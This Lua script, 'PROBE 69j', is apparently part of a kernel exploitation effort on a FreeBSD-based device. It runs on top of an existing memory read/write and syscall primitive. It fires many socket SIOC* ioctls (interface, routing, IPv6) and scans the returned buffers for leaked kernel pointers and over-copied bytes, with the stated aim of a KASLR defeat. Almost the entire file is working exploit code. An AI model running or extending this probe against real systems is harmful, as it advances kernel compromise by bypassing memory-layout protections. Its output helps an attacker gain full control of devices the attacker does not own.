-- CRASH_CLASS: LOW
-- PROBE 69j: Socket-level SIOC* ioctl KASLR scan
--
-- Context: Our ioctl sweep tested /dev nodes but NEVER socket-level ioctls.
-- Praetorian's undisclosed info leak was in a VNET-jail-accessible subsystem.
-- Socket ioctls like SIOCGIFCONF return interface data that may contain
-- kernel pointers in padding or uninitialized fields.
--
-- Tests 10 SIOC* get-ioctls on a UDP socket with "lo0" interface name,
-- scanning all returned bytes for kernel pointer patterns.

print("=== PROBE 69j: SIOC* IOCTL KASLR SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Create a UDP socket for ioctls
local udp_fd = -1
do
    local ok, rv = pcall(function()
        return mk(97)(uint64(2), uint64(2), uint64(0))  -- AF_INET, SOCK_DGRAM, 0
    end)
    if ok then udp_fd = sgn(rv) end
end
print("UDP socket fd=" .. udp_fd)
if udp_fd < 0 then
    print("FATAL: cannot create UDP socket")
    print("=== PROBE 69j DONE ===")
    return
end

-- Helper: write a NUL-terminated string into buffer at addr
local function write_str(addr, s)
    for i = 1, #s do
        pcall(function() memory.write_byte(addr + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(addr + #s, 0) end)
end

-- Helper: fill buffer with sentinel
local function fill_sentinel(addr, size)
    for i = 0, size - 4, 4 do wd(addr + i, 0xCCCCCCCC) end
end

-- Helper: hex dump of modified region
local function hexdump(addr, size, label)
    local line = ""
    local any_noncc = false
    for i = 0, size - 1, 4 do
        local v = rd(addr + i) or 0xCCCCCCCC
        if v ~= 0xCCCCCCCC then any_noncc = true end
    end
    if not any_noncc then
        print("  " .. label .. ": all sentinels (no data written)")
        return
    end
    for row = 0, size - 1, 16 do
        local hex = string.format("  +%03X: ", row)
        for col = 0, 12, 4 do
            if row + col < size then
                local v = rd(addr + row + col) or 0
                hex = hex .. string.format("%08X ", v)
            end
        end
        print(hex)
    end
end

-- Helper: scan for kernel pointers in buffer
local function scan_kptrs(addr, size, label)
    local found = 0
    for off = 0, size - 8, 4 do
        local hi = rd(addr + off + 4) or 0
        local lo = rd(addr + off) or 0
        if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
            found = found + 1
            print(string.format("  *** KPTR %s off=%d: 0x%08X%08X ***", label, off, hi, lo))
        end
    end
    return found
end

-- Helper: count modified bytes past expected struct size
local function check_overcopy(addr, struct_size, buf_size)
    local extra = 0
    for off = struct_size, buf_size - 4, 4 do
        local v = rd(addr + off) or 0xCCCCCCCC
        if v ~= 0xCCCCCCCC then extra = extra + 1 end
    end
    return extra
end

local total_kptrs = 0

-- ============================================================
-- [A] IFREQ-BASED IOCTLS (struct ifreq = 32 bytes on FreeBSD)
-- ifreq: char ifr_name[16] + union ifr_ifru[16]
-- ============================================================
print("[A] IFREQ-based SIOC* ioctls on lo0")
print("")

local ioctls = {
    { name = "SIOCGIFFLAGS",   cmd = 0xC0206911, desc = "interface flags",     data_off = 16, data_len = 2 },
    { name = "SIOCGIFADDR",    cmd = 0xC0206921, desc = "interface address",    data_off = 16, data_len = 16 },
    { name = "SIOCGIFDSTADDR", cmd = 0xC0206922, desc = "destination address",  data_off = 16, data_len = 16 },
    { name = "SIOCGIFBRDADDR", cmd = 0xC0206923, desc = "broadcast address",   data_off = 16, data_len = 16 },
    { name = "SIOCGIFNETMASK", cmd = 0xC0206925, desc = "netmask",             data_off = 16, data_len = 16 },
    { name = "SIOCGIFMTU",     cmd = 0xC0206933, desc = "MTU",                 data_off = 16, data_len = 4 },
    { name = "SIOCGIFINDEX",   cmd = 0xC0206920, desc = "interface index",     data_off = 16, data_len = 4 },
    { name = "SIOCGIFPHYS",    cmd = 0xC0206935, desc = "physical type",       data_off = 16, data_len = 4 },
}

for _, ioc in ipairs(ioctls) do
    if not alive() then print("DEAD"); break end

    local buf = memory.alloc(0x100)  -- 256 bytes, ifreq is 32
    fill_sentinel(N(buf), 0x100)

    -- Write "lo0" as interface name at +0x00
    write_str(N(buf), "lo0")

    local ret = -999
    pcall(function()
        ret = sgn(mk(54)(uint64(udp_fd), uint64(ioc.cmd), uint64(N(buf))))
    end)

    local d0 = rd(N(buf) + 16) or 0xCCCCCCCC
    local d1 = rd(N(buf) + 20) or 0xCCCCCCCC
    local d2 = rd(N(buf) + 24) or 0xCCCCCCCC
    local d3 = rd(N(buf) + 28) or 0xCCCCCCCC

    local kp = scan_kptrs(N(buf), 0x100, ioc.name)
    total_kptrs = total_kptrs + kp

    local over = check_overcopy(N(buf), 32, 0x100)

    print(string.format("  %s (0x%08X): ret=%d data=[%08X %08X %08X %08X] kptr=%d over=%d",
        ioc.name, ioc.cmd, ret, d0, d1, d2, d3, kp, over))

    if kp > 0 or over > 0 then
        hexdump(N(buf), 64, ioc.name)
    end
end

if not alive() then print("DEAD after section A"); return end

-- ============================================================
-- [B] SIOCGIFSTATUS — larger struct (ifstat: name[16] + ascii[88])
-- Total = 0x68 (104 bytes), 88 bytes of status string
-- ============================================================
print("")
print("[B] SIOCGIFSTATUS (104-byte struct)")

do
    local buf = memory.alloc(0x200)  -- 512 bytes
    fill_sentinel(N(buf), 0x200)
    write_str(N(buf), "lo0")

    local ret = -999
    pcall(function()
        ret = sgn(mk(54)(uint64(udp_fd), uint64(0xC0586939), uint64(N(buf))))
    end)

    local kp = scan_kptrs(N(buf), 0x200, "GIFSTATUS")
    total_kptrs = total_kptrs + kp

    local over = check_overcopy(N(buf), 104, 0x200)

    print(string.format("  SIOCGIFSTATUS: ret=%d kptr=%d over=%d", ret, kp, over))

    if ret == 0 or kp > 0 or over > 0 then
        hexdump(N(buf), 128, "GIFSTATUS")
    end
end

if not alive() then print("DEAD after section B"); return end

-- ============================================================
-- [C] SIOCGIFCONF — variable-length interface list
-- struct ifconf: int ifc_len (4) + padding (4) + caddr_t ifc_buf (8)
-- Total header = 16 bytes; kernel fills ifc_buf with ifreq structs
-- ============================================================
print("")
print("[C] SIOCGIFCONF (variable-length interface list)")

do
    local data_buf = memory.alloc(0x1000)  -- 4096 bytes for interface data
    fill_sentinel(N(data_buf), 0x1000)

    -- struct ifconf on stack
    local ifc = memory.alloc(0x20)
    wd(N(ifc), 0x1000)  -- ifc_len = 4096
    wd(N(ifc) + 4, 0)   -- padding
    wq(N(ifc) + 8, uint64(N(data_buf)))  -- ifc_buf pointer

    local ret = -999
    pcall(function()
        ret = sgn(mk(54)(uint64(udp_fd), uint64(0xC0106924), uint64(N(ifc))))
    end)

    local returned_len = rd(N(ifc)) or 0
    print(string.format("  SIOCGIFCONF: ret=%d returned_len=%d (0x%X)", ret, returned_len, returned_len))

    if returned_len > 0 and returned_len <= 0x1000 then
        -- Scan all returned data for kernel pointers
        local kp = scan_kptrs(N(data_buf), returned_len, "GIFCONF")
        total_kptrs = total_kptrs + kp

        -- Parse ifreq entries (each 32 bytes: name[16] + sockaddr[16])
        local num_ifaces = math.floor(returned_len / 32)
        print(string.format("  interfaces: %d entries (%d bytes each)", num_ifaces, 32))

        for i = 0, math.min(num_ifaces, 20) - 1 do
            local entry_addr = N(data_buf) + i * 32
            -- Read interface name (first 16 bytes)
            local name_bytes = {}
            for j = 0, 15 do
                local b = nil
                pcall(function() b = memory.read_byte(entry_addr + j) end)
                if b and N(b) > 0 and N(b) < 128 then
                    table.insert(name_bytes, string.char(N(b)))
                else
                    break
                end
            end
            local ifname = table.concat(name_bytes)

            -- Read sockaddr at +16 (sa_len at +16, sa_family at +17, data at +18)
            local sa_len = nil
            pcall(function() sa_len = N(memory.read_byte(entry_addr + 16)) end)
            local sa_fam = nil
            pcall(function() sa_fam = N(memory.read_byte(entry_addr + 17)) end)

            -- Read full data portion as dwords
            local d0 = rd(entry_addr + 16) or 0
            local d1 = rd(entry_addr + 20) or 0
            local d2 = rd(entry_addr + 24) or 0
            local d3 = rd(entry_addr + 28) or 0

            print(string.format("  [%d] %-16s sa_len=%s fam=%s data=[%08X %08X %08X %08X]",
                i, ifname,
                sa_len and tostring(sa_len) or "?",
                sa_fam and tostring(sa_fam) or "?",
                d0, d1, d2, d3))

            -- Check qwords at +16, +20, +24 for kernel pointers
            for qoff = 16, 24, 4 do
                local hi = rd(entry_addr + qoff + 4) or 0
                if hi >= 0xFFFF8000 and hi ~= 0xFFFFFFFF then
                    local lo = rd(entry_addr + qoff) or 0
                    print(string.format("    *** KPTR at entry %d +%d: 0x%08X%08X ***", i, qoff, hi, lo))
                    total_kptrs = total_kptrs + 1
                end
            end
        end

        -- Full hex dump if fewer than 512 bytes
        if returned_len <= 512 then
            print("  -- full hex dump --")
            hexdump(N(data_buf), returned_len, "GIFCONF_DATA")
        end

        -- Check for data past returned_len (overcopy)
        local past_count = 0
        local past_limit = math.min(returned_len + 128, 0x1000)
        for off = returned_len, past_limit - 4, 4 do
            local v = rd(N(data_buf) + off) or 0xCCCCCCCC
            if v ~= 0xCCCCCCCC then past_count = past_count + 1 end
        end
        if past_count > 0 then
            print(string.format("  *** OVERCOPY: %d dwords modified past returned_len=%d ***", past_count, returned_len))
            hexdump(N(data_buf) + returned_len, 64, "OVERCOPY")
        end
    end
end

if not alive() then print("DEAD after section C"); return end

-- ============================================================
-- [D] Try same ioctls with different interface names
-- ============================================================
print("")
print("[D] SIOCGIFCONF interfaces + per-interface deep scan")

-- Get the interface list from SIOCGIFCONF and try each
do
    local data_buf2 = memory.alloc(0x1000)
    fill_sentinel(N(data_buf2), 0x1000)
    local ifc2 = memory.alloc(0x20)
    wd(N(ifc2), 0x1000)
    wd(N(ifc2) + 4, 0)
    wq(N(ifc2) + 8, uint64(N(data_buf2)))

    pcall(function()
        mk(54)(uint64(udp_fd), uint64(0xC0106924), uint64(N(ifc2)))
    end)

    local len2 = rd(N(ifc2)) or 0
    local num2 = math.floor(len2 / 32)
    local ifnames = {}

    for i = 0, math.min(num2, 10) - 1 do
        local entry = N(data_buf2) + i * 32
        local nb = {}
        for j = 0, 15 do
            local b = nil
            pcall(function() b = memory.read_byte(entry + j) end)
            if b and N(b) > 0 and N(b) < 128 then
                table.insert(nb, string.char(N(b)))
            else
                break
            end
        end
        local name = table.concat(nb)
        if #name > 0 then
            local seen = false
            for _, n in ipairs(ifnames) do if n == name then seen = true end end
            if not seen then table.insert(ifnames, name) end
        end
    end

    print(string.format("  Found %d unique interfaces", #ifnames))
    for _, n in ipairs(ifnames) do print("    " .. n) end

    -- Deep scan: for each interface, try SIOCGIFADDR and SIOCGIFFLAGS
    -- with 256-byte buffers to catch overcopy
    for _, ifn in ipairs(ifnames) do
        if not alive() then break end

        local buf = memory.alloc(0x100)
        fill_sentinel(N(buf), 0x100)
        write_str(N(buf), ifn)

        pcall(function()
            mk(54)(uint64(udp_fd), uint64(0xC0206921), uint64(N(buf)))  -- SIOCGIFADDR
        end)

        local kp = scan_kptrs(N(buf), 0x100, ifn .. "/ADDR")
        total_kptrs = total_kptrs + kp

        local over = check_overcopy(N(buf), 32, 0x100)
        if kp > 0 or over > 0 then
            print(string.format("  %s SIOCGIFADDR: kptr=%d over=%d", ifn, kp, over))
            hexdump(N(buf), 64, ifn .. "/ADDR")
        end
    end
end

if not alive() then print("DEAD after section D"); return end

-- ============================================================
-- [E] Extended SIOC* ioctls (less common, may leak more)
-- ============================================================
print("")
print("[E] Extended SIOC* ioctls")

local extended = {
    { name = "SIOCGIFMEDIA",    cmd = 0xC0306938, size = 48, desc = "media status" },
    { name = "SIOCGIFGENERIC",  cmd = 0xC020693A, size = 32, desc = "generic data" },
    { name = "SIOCGIFPSRCADDR", cmd = 0xC0206927, size = 32, desc = "physical src addr" },
    { name = "SIOCGIFPDSTADDR", cmd = 0xC0206928, size = 32, desc = "physical dst addr" },
    { name = "SIOCGIFDESCR",    cmd = 0xC0206942, size = 32, desc = "interface description" },
    { name = "SIOCGIFFIB",     cmd = 0xC020695C, size = 32, desc = "FIB number" },
    { name = "SIOCGIFGROUP",   cmd = 0xC0286988, size = 40, desc = "interface group list" },
}

for _, ioc in ipairs(extended) do
    if not alive() then break end

    local buf = memory.alloc(0x200)
    fill_sentinel(N(buf), 0x200)
    write_str(N(buf), "lo0")

    local ret = -999
    pcall(function()
        ret = sgn(mk(54)(uint64(udp_fd), uint64(ioc.cmd), uint64(N(buf))))
    end)

    local kp = scan_kptrs(N(buf), 0x200, ioc.name)
    total_kptrs = total_kptrs + kp

    local over = check_overcopy(N(buf), ioc.size, 0x200)

    local d0 = rd(N(buf) + 16) or 0xCCCCCCCC
    local d1 = rd(N(buf) + 20) or 0xCCCCCCCC

    print(string.format("  %s (0x%08X): ret=%d data=[%08X %08X] kptr=%d over=%d",
        ioc.name, ioc.cmd, ret, d0, d1, kp, over))

    if kp > 0 or over > 0 then
        hexdump(N(buf), math.min(ioc.size + 32, 128), ioc.name)
    end
end

if not alive() then print("DEAD after section E"); return end

-- ============================================================
-- [F] Routing socket ioctls (different from AF_ROUTE messages)
-- ============================================================
print("")
print("[F] Routing-related ioctls")

local route_ioctls = {
    { name = "SIOCADDRT",    cmd = 0x8040720A, size = 64, desc = "add route" },
    { name = "SIOCDELRT",    cmd = 0x8040720B, size = 64, desc = "delete route" },
    { name = "SIOCGETSGCNT",  cmd = 0xC0207210, size = 32, desc = "scatter/gather count" },
    { name = "SIOCGETMIFCNT", cmd = 0xC0287212, size = 40, desc = "multicast if count" },
}

-- Use a raw socket for routing ioctls
local raw_fd = -1
pcall(function()
    raw_fd = sgn(mk(97)(uint64(2), uint64(3), uint64(0)))  -- AF_INET, SOCK_RAW, 0
end)
print("  RAW socket fd=" .. raw_fd)

local test_fd = raw_fd >= 0 and raw_fd or udp_fd

for _, ioc in ipairs(route_ioctls) do
    if not alive() then break end

    local buf = memory.alloc(0x100)
    fill_sentinel(N(buf), 0x100)

    local ret = -999
    pcall(function()
        ret = sgn(mk(54)(uint64(test_fd), uint64(ioc.cmd), uint64(N(buf))))
    end)

    local kp = scan_kptrs(N(buf), 0x100, ioc.name)
    total_kptrs = total_kptrs + kp

    print(string.format("  %s (0x%08X): ret=%d kptr=%d", ioc.name, ioc.cmd, ret, kp))

    if kp > 0 then
        hexdump(N(buf), 64, ioc.name)
    end
end

if not alive() then print("DEAD after section F"); return end

-- ============================================================
-- [G] IPv6 socket ioctls
-- ============================================================
print("")
print("[G] IPv6 socket ioctls")

local v6_fd = -1
pcall(function()
    v6_fd = sgn(mk(97)(uint64(28), uint64(2), uint64(0)))  -- AF_INET6, SOCK_DGRAM, 0
end)
print("  IPv6 UDP socket fd=" .. v6_fd)

if v6_fd >= 0 then
    local v6_ioctls = {
        { name = "SIOCGIFADDR_IN6",  cmd = 0xC0206921, size = 32 },
        { name = "SIOCGIFFLAGS_IN6", cmd = 0xC0206911, size = 32 },
        { name = "SIOCGIFNETMASK6",  cmd = 0xC0206925, size = 32 },
    }

    for _, ioc in ipairs(v6_ioctls) do
        if not alive() then break end

        local buf = memory.alloc(0x100)
        fill_sentinel(N(buf), 0x100)
        write_str(N(buf), "lo0")

        local ret = -999
        pcall(function()
            ret = sgn(mk(54)(uint64(v6_fd), uint64(ioc.cmd), uint64(N(buf))))
        end)

        local kp = scan_kptrs(N(buf), 0x100, ioc.name)
        total_kptrs = total_kptrs + kp

        local over = check_overcopy(N(buf), ioc.size, 0x100)

        print(string.format("  %s (0x%08X): ret=%d kptr=%d over=%d",
            ioc.name, ioc.cmd, ret, kp, over))

        if kp > 0 or over > 0 then
            hexdump(N(buf), 64, ioc.name)
        end
    end

    -- SIOCGIFALIFETIME_IN6 — address lifetime, larger struct
    do
        local buf = memory.alloc(0x200)
        fill_sentinel(N(buf), 0x200)
        write_str(N(buf), "lo0")

        local ret = -999
        pcall(function()
            -- SIOCGIFALIFETIME_IN6 = 0xC078692D (120-byte struct)
            ret = sgn(mk(54)(uint64(v6_fd), uint64(0xC078692D), uint64(N(buf))))
        end)

        local kp = scan_kptrs(N(buf), 0x200, "GIFALIFETIME6")
        total_kptrs = total_kptrs + kp

        print(string.format("  SIOCGIFALIFETIME_IN6: ret=%d kptr=%d", ret, kp))

        if ret == 0 or kp > 0 then
            hexdump(N(buf), 128, "GIFALIFETIME6")
        end
    end

    pcall(function() mk(6)(uint64(v6_fd)) end)
end

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print(string.format("TOTAL KERNEL POINTERS FOUND: %d", total_kptrs))
if total_kptrs > 0 then
    print("*** KASLR DEFEAT POSSIBLE VIA SOCKET IOCTL ***")
else
    print("No kernel pointers found in any socket ioctl")
end
print("")
print("alive=" .. (alive() and "YES" or "NO"))

-- Cleanup
pcall(function() mk(6)(uint64(udp_fd)) end)
if raw_fd >= 0 then pcall(function() mk(6)(uint64(raw_fd)) end) end

print("")
print("=== PROBE 69j COMPLETE ===")
